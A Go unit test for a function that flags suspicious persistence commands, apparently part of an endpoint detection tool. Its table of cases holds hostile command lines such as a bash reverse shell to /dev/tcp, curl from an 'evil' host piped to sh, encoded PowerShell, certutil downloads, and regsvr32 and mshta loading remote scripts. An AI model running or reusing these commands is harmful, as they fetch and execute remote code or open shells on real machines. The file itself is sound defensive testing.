package persist

import "testing"

func TestSuspiciousFlagsKnownPatterns(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		path string
		want bool
	}{
		{"tmp dir unix", "/tmp/updater.sh", "/tmp/updater.sh", true},
		{"temp dir windows", `C:\Users\bob\AppData\Local\Temp\svc.exe`, "", true},
		{"downloads unix", "/home/bob/Downloads/setup.sh", "", true},
		{"downloads windows", `C:\Users\bob\Downloads\setup.exe`, "", true},
		{"base64 payload", "echo aGVsbG8= | base64 -d | sh", "", true},
		{"curl download", "curl -s http://evil/x | sh", "", true},
		{"encoded powershell", "powershell -enc SQBFAFgA", "", true},
		{"reverse shell", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "", true},
		{"certutil download", "certutil -urlcache -f http://evil/x.exe x.exe", "", true},
		{"certutil decode", "certutil -decode payload.b64 payload.exe", "", true},
		{"wscript payload", "wscript.exe C:\\Users\\bob\\evil.vbs", "", true},
		{"mshta remote HTA", "mshta http://evil.example/a.hta", "", true},
		{"mshta local, not flagged", `mshta C:\Program Files\App\help.hta`, "", false},
		{"squiblydoo", "regsvr32 /s /u /i:http://evil/x.sct scrobj.dll", "", true},
		{"regsvr32 legitimate, not flagged", `regsvr32 C:\Windows\System32\shell32.dll`, "", false},
		{"rundll32 javascript", `rundll32.exe javascript:"..\\mshtml,RunHTMLApplication ";alert(1)`, "", true},
		{"rundll32 legitimate, not flagged", `rundll32.exe shell32.dll,Control_RunDLL`, "", false},
		{"hidden unix executable", "", "/home/bob/.cache/payload", true},
		{"ordinary command, not flagged", `C:\Program Files\Vendor\App.exe --minimized`, "", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := suspicious(c.cmd, c.path) != ""
			if got != c.want {
				t.Fatalf("suspicious(%q, %q) flagged=%v, want %v", c.cmd, c.path, got, c.want)
			}
		})
	}
}
